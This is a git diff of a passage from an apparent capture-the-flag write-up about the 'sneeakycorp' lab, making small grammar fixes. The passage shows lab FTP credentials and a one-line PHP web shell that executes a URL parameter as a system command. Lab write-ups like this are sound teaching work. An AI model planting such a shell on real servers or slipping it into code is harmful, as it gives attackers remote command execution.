@@ -64,13 +64,13 @@ To connect to the database and see the emails of the user I used evolution wich 
 ![password_reset_mail.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/9bb834cf2b324cce84e14d77378c9161.png)
 
 
-I failed to SSH with `developer:m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C` credentials but successfully logged into FTP. Developer has access to `dev` directory and could upload php files. I modified my hosts file again and add the subdomain `dev.sneeakycorp`.
+I failed to SSH with `developer:m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C` credentials but successfully logged into FTP. The developer has access to `dev` directory and could upload php files. I modified my hosts file again and add the subdomain `dev.sneeakycorp`.
 
 
 
 ![hostsV2.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/d72cde4d60e14d1ca7081b25c22c0336.png)
 
-Created PHP script which took one parameter and executed as a command line.
+Created a PHP script which took one parameter and executed the content as a command line.
 ```php
 # Content of 'shell.php'
 <?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
